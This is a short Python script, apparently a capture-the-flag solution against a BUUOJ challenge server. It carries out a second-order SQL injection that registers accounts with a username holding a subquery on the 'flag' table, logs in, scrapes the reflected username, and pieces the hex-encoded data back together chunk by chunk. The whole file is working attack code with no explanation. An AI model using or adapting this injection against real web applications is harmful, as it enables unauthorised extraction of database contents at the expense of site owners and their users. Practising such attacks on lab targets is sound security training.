import requests
from lxml import etree
login_url='http://e2281609-5661-4bef-aa89-1a982a928544.node4.buuoj.cn:81/login.php'
register_url='http://e2281609-5661-4bef-aa89-1a982a928544.node4.buuoj.cn:81/register.php'
content=''
for i in range(1,20):
    data_register={'email':'15@%d'%i,'username':"0'+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+'0"%i,'password':'1'}
    #print(data)
    data_login={'email':'15@%d'%i,'password':'1'}
    requests.post(register_url,data=data_register)
    rr=requests.post(login_url,data=data_login)
    rr.encoding='utf-8'
    html = etree.HTML(rr.text)
    uname =html.xpath("//span[@class='user-name']/text()")[0]
    cont=uname.strip('\n').strip(' ')
    content+=cont
    print(cont)
# content=content.decode('hex').decode('hex')
print(content)


